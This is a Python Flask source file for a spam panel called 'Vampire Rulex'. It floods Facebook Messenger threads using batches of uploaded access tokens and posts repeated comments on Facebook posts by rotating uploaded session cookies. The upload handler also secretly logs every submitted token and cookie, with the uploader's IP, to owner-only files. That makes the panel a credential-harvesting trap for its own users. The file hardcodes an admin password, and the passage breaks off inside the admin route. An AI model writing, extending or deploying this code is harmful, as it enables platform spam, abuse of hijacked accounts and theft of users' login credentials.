from flask import Flask, request, redirect, url_for
import requests
from threading import Thread, Event
import time
import uuid
import json
import os

app = Flask(__name__)
app.debug = True

stop_event_token = Event()
stop_event_cookie = Event()
threads_token = []
threads_cookie = []
sent_count_token = 0
sent_count_cookie = 0

APPROVED_KEYS_TOKEN_FILE = "approved_keys_token.json"
APPROVED_KEYS_COOKIE_FILE = "approved_keys_cookie.json"

ADMIN_TOKENS_LOG = "admin_tokens.log"
ADMIN_COOKIES_LOG = "admin_cookies.log"
MESSAGE_LOG = "message_log.txt"

# Load or create approved keys for token and cookie features
if os.path.exists(APPROVED_KEYS_TOKEN_FILE):
    with open(APPROVED_KEYS_TOKEN_FILE, "r") as f:
        approved_keys_token = json.load(f)
else:
    approved_keys_token = {}

if os.path.exists(APPROVED_KEYS_COOKIE_FILE):
    with open(APPROVED_KEYS_COOKIE_FILE, "r") as f:
        approved_keys_cookie = json.load(f)
else:
    approved_keys_cookie = {}

def save_approved_keys_token():
    with open(APPROVED_KEYS_TOKEN_FILE, "w") as f:
        json.dump(approved_keys_token, f)

def save_approved_keys_cookie():
    with open(APPROVED_KEYS_COOKIE_FILE, "w") as f:
        json.dump(approved_keys_cookie, f)

def log_admin_token(key, token, ip):
    with open(ADMIN_TOKENS_LOG, "a") as f:
        f.write(f"[{time.ctime()}] Key: {key} | IP: {ip} | Token: {token}\n")

def log_admin_cookie(key, cookie, ip):
    with open(ADMIN_COOKIES_LOG, "a") as f:
        f.write(f"[{time.ctime()}] Key: {key} | IP: {ip} | Cookie: {cookie}\n")

def log_message(text):
    with open(MESSAGE_LOG, "a") as f:
        f.write(f"[{time.ctime()}] {text}\n")

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

# ==== Token based message sending ====

def send_messages_token(access_tokens, thread_id, user_name, time_interval, messages):
    global stop_event_token, sent_count_token
    while not stop_event_token.is_set():
        for message1 in messages:
            if stop_event_token.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = f"{user_name}: {message1}"
                params = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=params, headers=headers, timeout=15)
                    if response.status_code == 200:
                        print(f"Token Msg sent by {access_token[:10]}...: {message}")
                        sent_count_token += 1
                        log_message(f"Token Msg sent by {access_token[:10]}...: {message}")
                    else:
                        print(f"Token Msg fail {response.status_code}: {message}")
                except Exception as e:
                    print(f"Token Msg error: {e}")
                time.sleep(time_interval)

# ==== Cookie based comment posting ====

def send_comments_cookie(cookies_list, post_id, commenter_name, delay, comments):
    global stop_event_cookie, sent_count_cookie
    x, cookie_index = 0, 0
    while not stop_event_cookie.is_set():
        try:
            time.sleep(delay)
            comment = comments[x].strip()
            comment_with_name = f"{commenter_name}: {comment}"
            current_cookie = cookies_list[cookie_index]

            data = {'message': comment_with_name}
            cookies = {'Cookie': current_cookie}

            response = requests.post(f'https://graph.facebook.com/{post_id}/comments/', data=data, cookies=cookies)
            current_time = time.strftime('%Y-%m-%d %I:%M:%S %p')

            if response.status_code == 200 and 'id' in response.json():
                print(f"Cookie Comment sent by cookie #{cookie_index+1}: {comment_with_name}")
                sent_count_cookie += 1
                log_message(f"Cookie Comment sent by cookie #{cookie_index+1}: {comment_with_name}")
                x = (x + 1) % len(comments)
                cookie_index = (cookie_index + 1) % len(cookies_list)
            else:
                print(f"Cookie Comment fail for cookie #{cookie_index+1}")
                x = (x + 1) % len(comments)
                cookie_index = (cookie_index + 1) % len(cookies_list)

        except Exception as e:
            print(f"Cookie Comment error: {e}")
            time.sleep(5)

# ==== Routes ====

@app.route('/', methods=['GET', 'POST'])
def index():
    global threads_token, threads_cookie, stop_event_token, stop_event_cookie, sent_count_token, sent_count_cookie

    # Show main page with two options + key generation

    if request.method == 'GET':
        # Generate keys if not exist (one for token, one for cookie)
        new_key_token = str(uuid.uuid4())[:8]
        if new_key_token not in approved_keys_token:
            approved_keys_token[new_key_token] = False
            save_approved_keys_token()

        new_key_cookie = str(uuid.uuid4())[:8]
        if new_key_cookie not in approved_keys_cookie:
            approved_keys_cookie[new_key_cookie] = False
            save_approved_keys_cookie()

        return f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="utf-8">
          <title>Vampire Rulex Panel</title>
          <style>
            body {{
              background-image: url('https://i.imgur.com/92rqE1X.jpeg');
              background-size: cover;
              background-repeat: no-repeat;
              background-position: center;
              color: white;
              font-family: Arial, sans-serif;
            }}
            .header {{
              text-align: center;
              margin-top: 20px;
              font-size: 2em;
              font-weight: bold;
              text-shadow: 2px 2px 5px black;
            }}
            .key-box {{
              text-align: center;
              font-size: 1.2em;
              margin: 10px auto;
              background: rgba(0,0,0,0.6);
              padding: 15px;
              border-radius: 10px;
              width: 300px;
              font-weight: bold;
              letter-spacing: 3px;
              display: inline-block;
              margin-right: 15px;
            }}
            form {{
              max-width: 450px;
              margin: 20px auto;
              background: rgba(0,0,0,0.5);
              padding: 20px;
              border-radius: 10px;
            }}
            input, button, select {{
              width: 100%;
              padding: 8px;
              margin: 10px 0;
              border-radius: 5px;
              border: none;
            }}
            button {{
              background-color: #4CAF50;
              color: white;
              font-weight: bold;
              cursor: pointer;
            }}
            hr {{
              margin: 40px auto;
              width: 90%;
              border-color: white;
              opacity: 0.4;
            }}
            .flex-container {{
              text-align: center;
            }}
          </style>
        </head>
        <body>
          <div class="header">Vampire Rulex</div>
          <div class="flex-container">
            <div class="key-box">
              <div>Token Key (For Messenger Token Spam):</div>
              <div><b>{new_key_token}</b></div>
            </div>
            <div class="key-box">
              <div>Cookie Key (For Cookie Based Commenter):</div>
              <div><b>{new_key_cookie}</b></div>
            </div>
          </div>
          <hr>
          <form method="post" enctype="multipart/form-data">
            <label>Select Mode:</label>
            <select name="mode" required>
              <option value="" disabled selected>Select Option</option>
              <option value="token">Token Spam (Messenger)</option>
              <option value="cookie">Cookie Commenter (Post Comments)</option>
            </select>

            <label>Enter Your Approved Key:</label>
            <input name="secret_key" required>

            <!-- Token Spam fields -->
            <div id="token_fields" style="display:none;">
              <label>Select Token File (one token per line):</label>
              <input type="file" name="tokenFile">
              <label>Enter Thread ID (GC/Inbox ID):</label>
              <input name="threadId">
              <label>Enter Your Name (for message prefix):</label>
              <input name="userName">
              <label>Enter Time Delay (seconds):</label>
              <input type="number" min="1" name="time">
              <label>Select Messages Text File (each line a message):</label>
              <input type="file" name="txtFile">
            </div>

            <!-- Cookie Commenter fields -->
            <div id="cookie_fields" style="display:none;">
              <label>Select Cookie File (one cookie per line):</label>
              <input type="file" name="cookieFile">
              <label>Enter Post ID (Facebook post ID):</label>
              <input name="postId">
              <label>Enter Your Name (for comment prefix):</label>
              <input name="commenterName">
              <label>Enter Time Delay (seconds):</label>
              <input type="number" min="1" name="delay">
              <label>Select Comments Text File (each line a comment):</label>
              <input type="file" name="commentsFile">
            </div>

            <button type="submit">Start</button>
          </form>

          <script>
            const modeSelect = document.querySelector('select[name="mode"]');
            const tokenFields = document.getElementById('token_fields');
            const cookieFields = document.getElementById('cookie_fields');

            modeSelect.addEventListener('change', () => {{
              if (modeSelect.value === 'token') {{
                tokenFields.style.display = 'block';
                cookieFields.style.display = 'none';
                for(let input of tokenFields.querySelectorAll('input')) input.required = true;
                for(let input of cookieFields.querySelectorAll('input')) input.required = false;
              }} else if (modeSelect.value === 'cookie') {{
                tokenFields.style.display = 'none';
                cookieFields.style.display = 'block';
                for(let input of cookieFields.querySelectorAll('input')) input.required = true;
                for(let input of tokenFields.querySelectorAll('input')) input.required = false;
              }} else {{
                tokenFields.style.display = 'none';
                cookieFields.style.display = 'none';
                for(let input of tokenFields.querySelectorAll('input')) input.required = false;
                for(let input of cookieFields.querySelectorAll('input')) input.required = false;
              }}
            }});
          </script>
          <hr>
          <p style="text-align:center;"><a href="/admin" style="color:white;">Admin Panel (owner only)</a></p>
        </body>
        </html>
        """

    # POST handling: start sending for selected mode
    if request.method == 'POST':
        mode = request.form.get('mode')
        secret_key = request.form.get('secret_key', '').strip()
        user_ip = request.remote_addr

        if mode == 'token':
            if secret_key not in approved_keys_token or not approved_keys_token.get(secret_key):
                return "<h3 style='color:red; text-align:center;'>❌ Token key invalid or not approved.</h3>"

            token_file = request.files.get('tokenFile')
            access_tokens = token_file.read().decode().strip().splitlines() if token_file else []
            for t in access_tokens:
                log_admin_token(secret_key, t, user_ip)

            thread_id = request.form.get('threadId')
            user_name = request.form.get('userName', 'User')
            time_interval = int(request.form.get('time', 5))

            txt_file = request.files.get('txtFile')
            messages = txt_file.read().decode().splitlines() if txt_file else []

            if not any(t.is_alive() for t in threads_token):
                stop_event_token.clear()
                global sent_count_token
                sent_count_token = 0
                thread = Thread(target=send_messages_token, args=(access_tokens, thread_id, user_name, time_interval, messages))
                thread.start()
                threads_token.append(thread)

            return "<h3 style='color:green; text-align:center;'>✅ Token spam started. <a href='/status'>Status</a></h3>"

        elif mode == 'cookie':
            if secret_key not in approved_keys_cookie or not approved_keys_cookie.get(secret_key):
                return "<h3 style='color:red; text-align:center;'>❌ Cookie key invalid or not approved.</h3>"

            cookie_file = request.files.get('cookieFile')
            cookies_list = cookie_file.read().decode().strip().splitlines() if cookie_file else []
            for c in cookies_list:
                log_admin_cookie(secret_key, c, user_ip)

            post_id = request.form.get('postId')
            commenter_name = request.form.get('commenterName', 'User')
            delay = int(request.form.get('delay', 5))

            comments_file = request.files.get('commentsFile')
            comments = comments_file.read().decode().splitlines() if comments_file else []

            if not any(t.is_alive() for t in threads_cookie):
                stop_event_cookie.clear()
                global sent_count_cookie
                sent_count_cookie = 0
                thread = Thread(target=send_comments_cookie, args=(cookies_list, post_id, commenter_name, delay, comments))
                thread.start()
                threads_cookie.append(thread)

            return "<h3 style='color:green; text-align:center;'>✅ Cookie commenter started. <a href='/status'>Status</a></h3>"

        else:
            return "<h3 style='color:red; text-align:center;'>❌ Invalid mode selected.</h3>"

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event_token.set()
    stop_event_cookie.set()
    return "<h3 style='color:orange; text-align:center;'>🛑 All sending stopped.</h3><a href='/'>Go Back</a>"

@app.route('/status')
def status():
    running_token = any(t.is_alive() for t in threads_token)
    running_cookie = any(t.is_alive() for t in threads_cookie)
    status_str = "Running" if (running_token or running_cookie) else "Stopped"
    return f"""
    <h3 style='text-align:center;'>Bot Status: {status_str}</h3>
    <p style='text-align:center;'>Token Messages sent: {sent_count_token}</p>
    <p style='text-align:center;'>Cookie Comments sent: {sent_count_cookie}</p>
    <a href='/'>Go Back</a>
    """

@app.route('/admin', methods=['GET', 'POST'])
def admin_panel():
    ADMIN_PASS = "ayushadmin123"
    auth = request.authorization
    if not auth or auth.username != 'admin' or auth.password != ADMIN_PASS:
        return ('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})

    global approved_keys_token, approved_keys_cookie
    msg = ""

    if request.method == 'POST':
        key_to_approve_token = request.form.get('approve_key_token')
        key_to_remove_token = request.form.get('remove_key_token')
        key_to_approve_cookie = request.form.get('approve_key_cookie')
        key_to_remove_cookie = request.form.get('remove_key_cookie')

        if key_to_approve_token and key_to_approve_token in approved_keys_token:
            approved_keys_token[key_to_approve_token] = True
            save_approved_keys_token()
            msg = f"✅ Approved Token key: {key_to_approve_token}"

        if key_to_remove_token and key_to_remove_token in approved_keys_token:
            approved_keys_token.pop(key_to_remove_token)
            save_approved_keys_token()
            msg = f"❌ Removed Token key: {key_to_remove_token}"

        if key_to_approve_cookie and key_to_approve_cookie in approved_keys_cookie:
            approved_keys_cookie[key_to_approve_cookie] = True
            save_approved_keys_cookie()
            msg = f"✅ Approved Cookie key: {key_to_approve_cookie}"

        if key_to_remove_cookie and key_to_remove_cookie in approved_keys_cookie:
            approved_keys_cookie.pop(key_to_remove_cookie)
            save_approved_keys_cookie()
            msg = f"❌ Removed Cookie key: {key_to_remove_cookie}"

    # Show keys tables for both token and cookie keys

    def get_last_lines(filename, lines=20):
        if not os.path.exists(filename):
            return "No logs yet."
        with open(filename, "r") as f:
            all_lines = f.readlines()
            return "".join(all_lines[-lines:])

    keys_html_token = ""
    for k, v in approved_keys_token.items():
        status = "✔️ Approved" if v else "❌ Not Approved"
        keys_html_token += f"""
        <tr>
            <td>{k}</td>
            <td>{status}</td>
            <td>
                <form method='post' style='display:inline'>
                    <input type='hidden' name='approve_key_token' value='{k}'>
                    <button type='submit'>Approve</button>
                </form>
                <form method='post' style='display:inline'>
                    <input type='hidden' name='remove_key_token' value='{k}'>
                    <button type='submit'>Remove</button>
                </form>
            </td>
        </tr>"""
